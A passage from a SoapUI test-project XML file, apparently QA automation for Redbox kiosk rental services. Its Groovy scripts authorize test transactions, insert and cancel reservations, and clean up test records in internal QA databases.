testRunner.testCase.setPropertyValue("EndTime", new java.text.SimpleDateFormat("MM/dd/yy-HH:mm:ss.SSS").format(new java.util.Date()));</con:tearDownScript><con:properties><con:property><con:name>TransactionID</con:name><con:value>1983119</con:value></con:property><con:property><con:name>InvoiceID</con:name><con:value>2149058214</con:value></con:property><con:property><con:name>CustomerProfileNumber</con:name><con:value xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">90284864596698</con:value></con:property><con:property><con:name>RentalTaxRate</con:name><con:value>9.7500</con:value></con:property><con:property><con:name>PurchaseTaxRate</con:name><con:value>8.0000</con:value></con:property><con:property><con:name>DigitalPurchaseTaxRate</con:name><con:value>0.0000</con:value></con:property><con:property><con:name>ServiceFeeTaxRate</con:name><con:value>9.9500</con:value></con:property><con:property><con:name>TestCaseStatus</con:name><con:value>Return PASS</con:value></con:property><con:property><con:name>ScenarioNo</con:name><con:value>107</con:value></con:property><con:property><con:name>StartTime</con:name><con:value>12/26/18-14:27:26.115</con:value></con:property><con:property><con:name>EndTime</con:name><con:value>12/26/18-14:32:02.740</con:value></con:property><con:property><con:name>ServiceFeeAmount</con:name><con:value>0.0900</con:value></con:property><con:property><con:name>ScenarioCount</con:name><con:value>104</con:value></con:property></con:properties><con:reportParameters/><con:breakPoints><con:testStepId>6873cb8c-7751-4904-9fc0-ed152c6ef0c6</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>d498c61d-c9fd-48e5-baf1-1503a4a1b824</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>275f8372-53c8-49f3-807b-3f64816f3d89</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>3b329060-a4aa-4532-9611-e37bcd9a11c3</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>f9658b22-7814-4f47-af67-f42efbd6c101</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>ef30018b-951d-43d4-95b1-5f1c3248c5b1</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>b3b7c784-7c50-42e4-b75d-8e6f746e026c</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>347bcb1b-704d-4b55-82ea-8c570a159ab9</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>09eaa7a0-2291-4d7a-84cd-5c6da1e51274</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints></con:testCase><con:testCase id="50064856-704c-4614-bfe4-ee68aee4c8e3" discardOkResults="true" failOnError="false" failTestCaseOnErrors="true" keepSession="false" name="CancelReservation" searchProperties="true" timeout="0" wsrmEnabled="false" wsrmVersion="1.0" wsrmAckTo="" amfAuthorisation="false" amfEndpoint="" amfLogin="" amfPassword="" maxResults="0"><con:settings><con:setting id="IncludeOverview">true</con:setting><con:setting id="IncludeResults">true</con:setting><con:setting id="FlowLayout">false</con:setting><con:setting id="ErrorDetails">true</con:setting><con:setting id="IncludeCoverage">true</con:setting></con:settings><con:testStep type="jdbc" name="WarmUp Script" id="f0a9f6df-68a9-4334-8f01-0cfbdd5a594b"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>RedboxServerDB</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB100.rb.local:1433;databaseName=RedboxServerDB;integratedSecurity=true;</con:connectionString><con:password>t</con:password><con:connectionProperties/><con:query>Select GetDate() AS CurrentDateTime</con:query><con:assertion type="JDBC Status" id="e7a3f403-20b0-4593-81c5-1aceb211b870" name="JDBC Status"/><con:properties/></con:config></con:testStep><con:testStep type="datasource" name="DataSource" id="b9f89e3c-eae7-46ad-9538-e88917833f94"><con:settings><con:setting id="com.eviware.soapui.impl.wsdl.teststeps.datasource.DataSourceContainer@prepared-properties">&lt;xml-fragment/></con:setting></con:settings><con:config xsi:type="con:DataSourceStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dataSource type="JDBC"><con:configuration><driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</driver><connstr>jdbc:sqlserver://QADB100.rb.local:1433;databaseName=QaAutomation;integratedSecurity=true;</connstr><pass>t</pass><Connection>QaAutomation( QAInt )</Connection><query>Select 
	KS_Pickup.ID As ID, 
	KS_Pickup.Scenario As Scenario,
	KS_Pickup.Email As Email, 
	KS_Pickup.CreditCardNumber As Ccnumber, 
	KS_Pickup.CreditCardType As CCType,
	KS_Pickup.PromoCode As PromoCode, 
	KS_Pickup.PromoValue As PromoValue, 
	KS_Pickup.KioskID As KioskID,
	KS_Pickup.RentalFormats As rentalFormats,
	KS_Pickup.NumberOfRentals As numOfRentals,
	KS_Pickup.RentalVendStatus As RentalVendStatus,
	KS_Pickup.PurchaseFormats As PurchaseFormats,
	KS_Pickup.NumberOfPurchases As numOfPurchases,
	KS_Pickup.PurchaseVendStatus As PurchaseVendStatus,
	KS_Pickup.SetDaysBack As SetDaysBack, 
	KS_Pickup.LoyaltyFlag As LoyaltyFlag, 
	KS_Pickup.MDVFlag As MDVFlag, 
	KS_Pickup.MDVDiscNumber As MDVDiscNumber, 
	KS_Pickup.TestCaseName As TestCaseName
From KS_Pickup
Where TestCaseName = 'Expire' </query><fetchSize/><stored-procedure>false</stored-procedure></con:configuration></con:dataSource><con:property>ID</con:property><con:property>Scenario</con:property><con:property>Email</con:property><con:property>Ccnumber</con:property><con:property>CCType</con:property><con:property>PromoCode</con:property><con:property>PromoValue</con:property><con:property>KioskID</con:property><con:property>rentalFormats</con:property><con:property>numOfRentals</con:property><con:property>RentalVendStatus</con:property><con:property>PurchaseFormats</con:property><con:property>numOfPurchases</con:property><con:property>PurchaseVendStatus</con:property><con:property>SetDaysBack</con:property><con:property>LoyaltyFlag</con:property><con:property>MDVFlag</con:property><con:property>MDVDiscNumber</con:property><con:property>TestCaseName</con:property><con:completeLastOperation>true</con:completeLastOperation><con:restartOnRun>true</con:restartOnRun></con:config></con:testStep><con:testStep type="groovy" name="Get Data" id="8a75381a-b1c1-4fdb-b94c-b8fea44e8ea2"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status
def ScenarioNo =  context.expand( '${DataSource#ID}' );
testRunner.testCase.setPropertyValue("ScenarioNo", ScenarioNo.toString())
log.info ("--------------------------" + context.testCase.name + "-------------------------");
log.info ("Scenario [$ScenarioNo]:Kiosk " + context.expand( '${DataSource#Scenario}' ));
log.info ("------------------------------START----------------------------------");

//Get Data from Data Source
def ccNumber = context.expand( '${DataSource#Ccnumber}' );
def kioskID = context.expand( '${DataSource#KioskID}' );
def UseCredits = '0'; //Default to ); since credits will be disabled after Loyality is ON
def IsOffline = context.expand( '${DataSource#IsOffline}' );

//Get Encrypted CC Info using Merchant Service method.
def encryptCC = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["Generate Encrypted CCInfo"];
encryptCC.setPropertyValue("CardNumber", ccNumber);
encryptCC.setPropertyValue("KeyID", context.expand( '${#Project#KeyId}' ));

def ccrunner = encryptCC.run( null, false );	
// show that it worked out ok
log.info("Status: $ccrunner.status, time taken for TestCase was: $ccrunner.timeTaken ms");
// assert that it didn't fail
assert ccrunner.status != Status.FAILED : ccrunner.reason

//Define the Db Connection
import groovy.sql.*;
// Below line will create an object of the already created JDBC connection.
def ConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('RedboxServerDB');
def constring = ConObj.getConnectionString();
//Define the Connection
def sql = Sql.newInstance(constring);

//Get TaxRate for the Kiosk.
def taxDetails = sql.firstRow("Select Sales_Tax_Rate, PurchaseTaxRate, DigitalPurchaseTaxRate, ServiceFeeTaxRate,ServiceFee  from KioskClient Where KioskClient_Id = $kioskID");
def rentalTaxRate = (taxDetails.Sales_Tax_Rate);
def purchaseTaxRate = (taxDetails.PurchaseTaxRate);
def digitalPurchaseTaxRate = (taxDetails.DigitalPurchaseTaxRate);
def serviceFeeTaxRate = (taxDetails.ServiceFeeTaxRate)!= null ? (taxDetails.ServiceFeeTaxRate) : "0.0000";
def serviceFeeAmount = (taxDetails.ServiceFee)!= null ? (taxDetails.ServiceFee) : "0.0000";

log.info ("KioskID:$kioskID; RentalTaxRate:$rentalTaxRate; PurchaseTaxRate:$purchaseTaxRate; DigitalPurchaseTaxRate:$digitalPurchaseTaxRate; ServiceFeeTaxRate:$serviceFeeTaxRate");
//Save Tax Rate at property level
testRunner.testCase.setPropertyValue('RentalTaxRate',rentalTaxRate.toString());
testRunner.testCase.setPropertyValue('PurchaseTaxRate',purchaseTaxRate.toString());
testRunner.testCase.setPropertyValue('DigitalPurchaseTaxRate',digitalPurchaseTaxRate.toString());
testRunner.testCase.setPropertyValue('ServiceFeeTaxRate',serviceFeeTaxRate.toString());
testRunner.testCase.setPropertyValue('ServiceFeeAmount',serviceFeeAmount.toString());

def getCP = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["Get Customer Info From Encrypted CC"];
getCP.setPropertyValue("CardHashId",encryptCC.getPropertyValue("CardID"));
def getCPrunner = getCP.run( null, false );	
// show that it worked out ok
log.info("Status: $getCPrunner.status, time taken for TestCase was: $getCPrunner.timeTaken ms");
// assert that it didn't fail
assert getCPrunner.status != Status.FAILED : getCPrunner.reason

//Get CustomerProfileNumber
def CustomerProfileNumber = getCP.getPropertyValue("CpCustomerNumber");
testRunner.testCase.setPropertyValue("CustomerProfileNumber",CustomerProfileNumber);
def CustomerID = getCP.getPropertyValue("CustomerId");
testRunner.testCase.setPropertyValue("AccountNumber",getCP.getPropertyValue("CpAccountNumber"));

//Deleting the records from CustomerDisc to avoid below error
//Found an existing CustomerDisc record for disc: XXXXX, matching customer: XXXXXX!  Echo message, rolling back reconcile
log.info("Number of customerdisc records deleted: " + sql.executeUpdate("DELETE FROM CustomerDisc WHERE CustomerId in ($CustomerID)"));

//Clear Open Rental and Reservations
def runCleanCustomer = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["Cleanup Open Transactions"];
runCleanCustomer.setPropertyValue("CustomerId",CustomerID);
runCleanCustomer.setPropertyValue("kioskID",kioskID);
def CleanCustomerrunner = runCleanCustomer.run( null, false );	
// show that it worked out ok
log.info("Status: $CleanCustomerrunner.status, time taken for TestCase [Cleanup Open Transactions] was: $CleanCustomerrunner.timeTaken ms");
// assert that it didn't fail
assert CleanCustomerrunner.status != Status.FAILED : CleanCustomerrunner.reason

//Create Credits.
if (CustomerProfileNumber != "" &amp;&amp; UseCredits == '2' &amp;&amp; IsOffline != "true")
{
	def generateCredits = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["Set Up Credits"];
	generateCredits.setPropertyValue("CpCustomerNumber",CustomerProfileNumber);
	generateCredits.setPropertyValue("DVDCreditQty",context.expand( '${DataSource#DVDCredits}' ));
	generateCredits.setPropertyValue("MovieCreditQty",context.expand( '${DataSource#MovieCredits}' ));
	generateCredits.setPropertyValue("GameCreditQty",context.expand( '${DataSource#GameCredits}' ));

	def generateCreditsrunner = generateCredits.run( null, false );	
	// show that it worked out ok
	log.info("Status: $generateCreditsrunner.status, time taken for TestCase was: $generateCreditsrunner.timeTaken ms");
	// assert that it didn't fail
	assert generateCreditsrunner.status != Status.FAILED : generateCreditsrunner.reason

	log.info ("Successfully Created Credits");
}
else
{
	log.info ("No credits required for the testCase or CustomerProfileNumber is NULL");
}</script></con:config></con:testStep><con:testStep type="groovy" name="Authorize" id="69d3b858-7bce-4fe8-9731-446aa05c7e2a"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status
def tc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["Authorize"];
//Cleaning up the properties; set the values to NULL before the start

for(int j=0;j&lt;tc.getPropertyCount();j++)
{
   tc.getPropertyAt(j).setValue("");
}

tc.setPropertyValue("Email", context.expand( '${DataSource#Email}' ));
tc.setPropertyValue("CCNumber", context.expand( '${DataSource#Ccnumber}' ));
tc.setPropertyValue("CCType", context.expand( '${DataSource#CCType}' ));
tc.setPropertyValue("PromoCode", context.expand( '${DataSource#PromoCode}' ));
tc.setPropertyValue("PromoValue", context.expand( '${DataSource#PromoValue}' ));
tc.setPropertyValue("KioskID", context.expand( '${DataSource#KioskID}' ));
tc.setPropertyValue("rentalFormats", context.expand( '${DataSource#rentalFormats}' ));
tc.setPropertyValue("numOfRentals", context.expand( '${DataSource#numOfRentals}' ));
tc.setPropertyValue("PurchaseFormats", context.expand( '${DataSource#PurchaseFormats}' ));
tc.setPropertyValue("numOfPurchases", context.expand( '${DataSource#numOfPurchases}' ));
tc.setPropertyValue("SetDaysBack", context.expand( '${DataSource#SetDaysBack}' ));
tc.setPropertyValue("LoyaltyFlag", context.expand( '${DataSource#LoyaltyFlag}' ));
tc.setPropertyValue("UseCredits", '0');//HardCoded to 0 since it there will be no credits in future
tc.setPropertyValue("IsOffline", 'false');//HardCoded
tc.setPropertyValue("RentalTaxRate", context.expand( '${#TestCase#RentalTaxRate}' ));
tc.setPropertyValue("PurchaseTaxRate", context.expand( '${#TestCase#PurchaseTaxRate}' ));
tc.setPropertyValue("DigitalPurchaseTaxRate", context.expand( '${#TestCase#DigitalPurchaseTaxRate}' ));
tc.setPropertyValue("CustomerProfileNumber", context.expand( '${#TestCase#CustomerProfileNumber}' ));
tc.setPropertyValue("EnableServiceFee", "true");
tc.setPropertyValue("ServiceFeeTaxRate", context.expand( '${#TestCase#ServiceFeeTaxRate}' ));
tc.setPropertyValue("ServiceFeeAmount", context.expand( '${#TestCase#ServiceFeeAmount}' ));
tc.setPropertyValue("HasUpsell", "false");
tc.setPropertyValue("HasOffer", "false");
tc.setPropertyValue("MDVFlag", context.expand( '${DataSource#MDVFlag}' ));
tc.setPropertyValue("MDVDiscNumber",context.expand( '${DataSource#MDVDiscNumber}' ));

//Check how to get the disc price

def runner = tc.run( null, false );
// show that it worked out ok
log.info("Status: $runner.status, time taken for TestCase [Authorize] was: $runner.timeTaken ms");
def tcStatus = (runner.status).toString()
if(tcStatus == "FAIL")
{
	assert runner.status == Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","Authorize $tcStatus");
	testRunner.gotoStepByName("SaveResults"); //No need to run the next steps.
	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));
}
else
{
	// assert that it didn't fail
	assert runner.status != Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","Authorize $tcStatus");
	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));
}</script></con:config></con:testStep><con:testStep type="groovy" name="GenerateReferenceNumber" id="e18e479d-6edf-407e-a0aa-1ff257400c29"><con:settings/><con:config><script>//NOTES: Disabled extra logging; no need to delete them. 
import java.util.Date
import java.util.Calendar
import java.text.DecimalFormat;
import com.eviware.soapui.model.testsuite.TestRunner.Status;
//Define the Db Connection
import groovy.sql.*;
// Below line will create an object of the already created JDBC connection.
def rbConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('RedboxServerDB');
def qaConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('QaAutomation');
def rbconstring = rbConObj.getConnectionString();
def qaconstring = qaConObj.getConnectionString();
//Define the Connection
def rbsql = Sql.newInstance(rbconstring);
def qasql = Sql.newInstance(qaconstring);

//Generate new sequenceNumber
def generateSequenceNumber = rbsql.call("exec [dbo].[rb_GetNextReferenceNumber]");

//Get SequenceNumber
def getSequenceNumber = qasql.firstRow("Select ReferenceNumber from QA_ReferenceNumber");
def ReferenceNumber = getSequenceNumber.ReferenceNumber.toString();
log.info ("ReferenceNumber:$ReferenceNumber");
testRunner.testCase.setPropertyValue("ReferenceNumber",ReferenceNumber.toString())

//Build SQL Query to Insert
//Get properties from Authorize test case from test suite Generic Steps (KioskService).
def authtc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["Authorize"];
def TransactionID = authtc.getPropertyValue("TransactionID")
def BarcodeForTnx = authtc.getPropertyValue("BarcodeForTnx");
def tnxDetails = rbsql.firstRow("Select ProcessorTran_ID,ApprovalCode,Rent_Date as RentDate,KioskClient_ID,ProcessorDeclinedCode,Add_Verification_Res,RentalTaxRate,AuthAmount,Customer_ID,InvoiceID,GetDate() As DateTime From [Transaction] Where Transaction_ID = $TransactionID");
def ProcessorTranID = tnxDetails.ProcessorTran_ID.toString();
def ApprovalCode = tnxDetails.ApprovalCode.toString();
def KioskID = tnxDetails.KioskClient_ID.toString();
def ProcessorDeclinedCode = tnxDetails.ProcessorDeclinedCode.toString();
def AVSResponseCode = tnxDetails.Add_Verification_Res.toString();
def SalesTaxRate = tnxDetails.RentalTaxRate.toString();
def AuthAmount = tnxDetails.AuthAmount.toString();
def CustomerID = tnxDetails.Customer_ID.toString();
def InvoiceID = tnxDetails.InvoiceID.toString();
def LastDateTime = tnxDetails.DateTime.toString();
def RentDate = tnxDetails.RentDate.toString();
def Email = context.expand( '${DataSource#Email}' );

def getWebAccountInfo = rbsql.firstRow("Select WebAccountID from WebAccount Where EmailAddress = '$Email'");
def WebAccountID = getWebAccountInfo.WebAccountID.toString();

log.info ("Barcode: $BarcodeForTnx; TransactionID:$TransactionID")
log.info ("ProcessorTranID:$ProcessorTranID;ApprovalCode:$ApprovalCode;KioskID:$KioskID;ProcessorDeclinedCode:$ProcessorDeclinedCode;AVSResponseCode:$AVSResponseCode;SalesTaxRate:$SalesTaxRate;AuthAmount:$AuthAmount;CustomerID:$CustomerID;InvoiceID:$InvoiceID;LastDateTime:$LastDateTime;WebAccountID:$WebAccountID")

//Build sql Query to insert into reservation table.
sqlQuery = ""
sqlQuery += "INSERT INTO [dbo].[Reservation]"
sqlQuery += "\n"
sqlQuery += "([CardID]"
sqlQuery += "\n"
sqlQuery += ",[KioskID]"
sqlQuery += "\n"
sqlQuery += ",[BarCode]"
sqlQuery += "\n"
sqlQuery += ",[ProcessorTranID]"
sqlQuery += "\n"
sqlQuery += ",[ReferenceNumber]"
sqlQuery += "\n"
sqlQuery += ",[ProcessorLogID]"
sqlQuery += "\n"
sqlQuery += ",[ApprovalCode]"
sqlQuery += "\n"
sqlQuery += ",[ProcessorDeclinedCode]"
sqlQuery += "\n"
sqlQuery += ",[AVSResponseCode]"
sqlQuery += "\n"
sqlQuery += ",[Email_Address]"
sqlQuery += "\n"
sqlQuery += ",[DateCreated]"
sqlQuery += "\n"
sqlQuery += ",[StatusCode]"
sqlQuery += "\n"
sqlQuery += ",[FailureCode]"
sqlQuery += "\n"
sqlQuery += ",[RentedDate]"
sqlQuery += "\n"
sqlQuery += ",[SalesTaxRate]"
sqlQuery += "\n"
sqlQuery += ",[AuthAmount]"
sqlQuery += "\n"
sqlQuery += ",[LastUpdate]"
sqlQuery += "\n"
sqlQuery += ",[CustomerID]"
sqlQuery += "\n"
sqlQuery += ",[InvoiceID]"
sqlQuery += "\n"
sqlQuery += ",[Mobile]"
sqlQuery += "\n"
sqlQuery += ",[UserAgent]"
sqlQuery += "\n"
sqlQuery += ",[WebAccountID]"
sqlQuery += "\n"
sqlQuery += ",[ClientIP]"
sqlQuery += "\n"
sqlQuery += ",[OmnitureSuiteId]"
sqlQuery += "\n"
sqlQuery += ",[RedboxDeviceIdentifier])"
sqlQuery += "\n"
sqlQuery += "VALUES"
sqlQuery += "\n"
sqlQuery += "(NULL"
sqlQuery += "\n"
sqlQuery += ",\'$KioskID\'"
sqlQuery += "\n"
sqlQuery += ",\'$BarcodeForTnx\'"
sqlQuery += "\n"
sqlQuery += ",\'$ProcessorTranID\'"
sqlQuery += "\n"
sqlQuery += ",\'$ReferenceNumber\'"
sqlQuery += "\n"
sqlQuery += ",\'$TransactionID\'"
sqlQuery += "\n"
sqlQuery += ",\'$ApprovalCode\'"
sqlQuery += "\n"
sqlQuery += ",\'$ProcessorDeclinedCode\'"
sqlQuery += "\n"
sqlQuery += ",\'I4\'"
sqlQuery += "\n"
sqlQuery += ",\'$Email\'"
sqlQuery += "\n"
sqlQuery += ",\'$LastDateTime\'"
sqlQuery += "\n"
sqlQuery += ",1"
sqlQuery += "\n"
sqlQuery += ",0"
sqlQuery += "\n"
sqlQuery += ",\'$RentDate\'"
sqlQuery += "\n"
sqlQuery += ",\'$SalesTaxRate\'"
sqlQuery += "\n"
sqlQuery += ",\'$AuthAmount\'"
sqlQuery += "\n"
sqlQuery += ",\'$LastDateTime\'"
sqlQuery += "\n"
sqlQuery += ",\'$CustomerID\'"
sqlQuery += "\n"
sqlQuery += ",\'$InvoiceID\'"
sqlQuery += "\n"
sqlQuery += ",0"
sqlQuery += "\n"
sqlQuery += ",\'SoapUI-Automation\'"
sqlQuery += "\n"
sqlQuery += ",\'$WebAccountID\'"
sqlQuery += "\n"
sqlQuery += ",\'10.30.7.238\'"
sqlQuery += "\n"
sqlQuery += ",3"
sqlQuery += "\n"
sqlQuery += ",NULL"
sqlQuery += "\n"
sqlQuery += ")"

def insertReservation = rbsql.execute(sqlQuery);

def updateTransaction = rbsql.execute("Update [Transaction] Set RentalType = 3 Where Transaction_ID = $TransactionID");</script></con:config></con:testStep><con:testStep type="groovy" name="CancelReservation" id="0341d190-422e-4502-82b1-9e8272d628f2"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status

//Set properties from Data Source
def tc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["CancelReservation"];
//Cleaning up the properties; set the values to NULL before the start
for(int j=0;j&lt;tc.getPropertyCount();j++)
{
   tc.getPropertyAt(j).setValue("");
}

//Get Data
tc.setPropertyValue("KioskID", context.expand( '${DataSource#KioskID}' ));
tc.setPropertyValue("ReferenceNumber", context.expand( '${#TestCase#ReferenceNumber}' ));
tc.setPropertyValue("TransactionID", context.expand( '${#TestCase#TransactionID}' ));

//Run the CancelReservation test case
def runner = tc.run( null, false );
// show that it worked out ok
log.info("Status: $runner.status, time taken for TestCase [CancelReservation] was: $runner.timeTaken ms");
def tcStatus = (runner.status).toString()
if(tcStatus == "FAIL")
{
	assert runner.status == Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","CancelReservation $tcStatus");
	testRunner.gotoStepByName("SaveResults"); //No need to run the next steps.
}
else
{
	// assert that it didn't fail
	assert runner.status != Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","CancelReservation $tcStatus");
	testRunner.gotoStepByName("DataSource Loop"); //No need to run the next steps.

	//Get Scenario Count
	testRunner.testCase.setPropertyValue("ScenarioCount", (testRunner.testCase.getPropertyValue("ScenarioCount").toShort() + 1 ).toString());
	testRunner.testCase.testSuite.project.testSuites[testRunner.testCase.testSuite.name].setPropertyValue("TotalScenarioCount", (testRunner.testCase.testSuite.project.testSuites[testRunner.testCase.testSuite.name].getPropertyValue("TotalScenarioCount").toShort() + 1 ).toString())
}</script></con:config></con:testStep><con:testStep type="datasink" name="SaveResults" id="5d63cec9-d3f9-4f3a-ad66-f01aad1ed51b"><con:settings/><con:config xsi:type="con:DataSinkStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dataSink type="File"><con:configuration><fileName>${projectDir}/Test_Results.txt</fileName><separator>:</separator><escape>"</escape><quote>false</quote><trim>true</trim><append>false</append><encoding>Cp1252</encoding></con:configuration></con:dataSink><con:properties><con:property><con:name>Number</con:name><con:value>${#TestCase#ScenarioNo}</con:value></con:property><con:property><con:name>Scenario</con:name><con:value>${DataSource#Scenario}</con:value></con:property><con:property><con:name>TransactionId</con:name><con:value>${#TestCase#TransactionId}</con:value></con:property><con:property><con:name>Status</con:name><con:value>${#TestCase#TestCaseStatus}</con:value></con:property><con:property><con:name>Date</con:name><con:value>${=new java.text.SimpleDateFormat("MM/dd/yy-HH:mm:ss.SSS").format(new java.util.Date())}</con:value></con:property></con:properties></con:config></con:testStep><con:testStep type="datasourceloop" name="DataSource Loop" id="bcb3c961-dcee-48f0-a8b2-a97b29028362"><con:settings/><con:config><dataSourceStep>DataSource</dataSourceStep><targetStep>Get Data</targetStep></con:config></con:testStep><con:setupScript>testRunner.testCase.setPropertyValue("StartTime", new java.text.SimpleDateFormat("MM/dd/yy-HH:mm:ss.SSS").format(new java.util.Date()));
log.info("/###########################START###########################/");
log.info("Test Case Name : " + context.testCase.name);
log.info("/###########################START###########################/");
//Cleanup Script
log.info("Cleaning up any open transactions from previous executions...");
import com.eviware.soapui.model.testsuite.TestRunner.Status
import groovy.json.JsonSlurper
import groovy.sql.Sql
testRunner.testCase.setPropertyValue("ScenarioCount", "0");
com.eviware.soapui.support.GroovyUtils.registerJdbcDriver("com.microsoft.sqlserver.jdbc.SQLServerDriver");
def rbConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('RedboxServerDB');
def rbconstring = rbConObj.getConnectionString();
def msConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('MerchantService');
def msconstring = msConObj.getConnectionString();
//Define the Connection
def sql = Sql.newInstance(rbconstring);
def mssql = Sql.newInstance(msconstring);

//Disable batching job.
mssql.execute("EXEC msdb.dbo.sp_update_job @job_name='CreateBatchItemsAndBatches',@enabled = 0");
log.info ("Batch Job is disabled");

log.info("...cleaning up transactions");
sql.eachRow("SELECT t.transaction_id FROM [Transaction] t INNER JOIN disc_transaction dt ON t.transaction_id = dt.transaction_id WHERE t.customer_id in (19799,264389) AND dt.Transaction_Type = 1  AND t.Transaction_Status = 4 AND ((dt.DiscTransaction_Status = 2) OR ( dt.DiscTransaction_Status = 4 AND t.ChargeDate IS NOT NULL AND (ApprovalCode IS NULL OR ApprovalCode = '')))"){
//for each transaction id remove disc transaction, transaction and customer disc etc
	row ->
	log.info("Number of rows deleted: " +sql.executeUpdate("DELETE FROM disc_transaction WHERE transaction_id = ${row.Transaction_Id}"))
	log.info("Number of rows deleted: " +sql.executeUpdate("DELETE FROM unplayablereturnhistory WHERE transactionid = ${row.Transaction_Id}"))
	log.info("Number of rows deleted: " +sql.executeUpdate("DELETE FROM [TRANSACTION] WHERE TRANSACTION_ID = ${row.Transaction_Id}"))
	log.info("Number of rows deleted: " +sql.executeUpdate("DELETE FROM CustomerTransaction WHERE TransactionID = ${row.Transaction_Id}"))
}


log.info("...cleaning up barcodes");
//reset the disc statuses to 'in kiosk'
log.info("Number of customer disc deleted: " + sql.executeUpdate("DELETE FROM CustomerDisc WHERE CustomerId in (19799,264389)"))
//sql.executeUpdate("UPDATE disc SET physical_status = 2 Where Title_ID in (Select Title_ID from Title WHere [FormatId] = 17) and KioskClient_ID = 1505")
sql.executeUpdate("UPDATE disc SET physical_status = 2 Where KioskClient_ID = 1505")

</con:setupScript><con:tearDownScript>import groovy.json.JsonSlurper
import groovy.sql.Sql
com.eviware.soapui.support.GroovyUtils.registerJdbcDriver("com.microsoft.sqlserver.jdbc.SQLServerDriver");
def msConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('MerchantService');
def msconstring = msConObj.getConnectionString();
//Define the Connection
def mssql = Sql.newInstance(msconstring);
//Enable batching job.
mssql.execute("EXEC msdb.dbo.sp_update_job @job_name='CreateBatchItemsAndBatches',@enabled = 1");
log.info ("Batch Job is Enabled");
def scenarioCount = context.expand( '${#TestCase#ScenarioCount}' )

log.info("/###########################END###########################/");
log.info("Test Case Name : " + context.testCase.name + "Test Case Status : " + testRunner.getStatus());
log.info("Scenario Count : $scenarioCount");
log.info ("Time Taken: ${((testRunner.timeTaken)/1000)/60} mins");
log.info("/###########################END###########################/");
testRunner.testCase.setPropertyValue("EndTime", new java.text.SimpleDateFormat("MM/dd/yy-HH:mm:ss.SSS").format(new java.util.Date()));</con:tearDownScript><con:properties><con:property><con:name>TransactionID</con:name><con:value>1983142</con:value></con:property><con:property><con:name>InvoiceID</con:name><con:value>2149058236</con:value></con:property><con:property><con:name>CustomerProfileNumber</con:name><con:value xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">90284864596698</con:value></con:property><con:property><con:name>RentalTaxRate</con:name><con:value>9.7500</con:value></con:property><con:property><con:name>PurchaseTaxRate</con:name><con:value>8.0000</con:value></con:property><con:property><con:name>DigitalPurchaseTaxRate</con:name><con:value>0.0000</con:value></con:property><con:property><con:name>ServiceFeeTaxRate</con:name><con:value>9.9500</con:value></con:property><con:property><con:name>TestCaseStatus</con:name><con:value>CancelReservation PASS</con:value></con:property><con:property><con:name>ScenarioNo</con:name><con:value>77</con:value></con:property><con:property><con:name>StartTime</con:name><con:value>12/26/18-14:32:25.578</con:value></con:property><con:property><con:name>EndTime</con:name><con:value>12/26/18-14:33:13.035</con:value></con:property><con:property><con:name>ServiceFeeAmount</con:name><con:value>0.0900</con:value></con:property><con:property><con:name>ReferenceNumber</con:name><con:value>5648659</con:value></con:property><con:property><con:name>AccountNumber</con:name><con:value>81483122978646</con:value></con:property><con:property><con:name>ScenarioCount</con:name><con:value>22</con:value></con:property></con:properties><con:reportParameters/><con:breakPoints><con:testStepId>6873cb8c-7751-4904-9fc0-ed152c6ef0c6</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>d498c61d-c9fd-48e5-baf1-1503a4a1b824</con:testStepId><con:status>NONE</con:status><con:p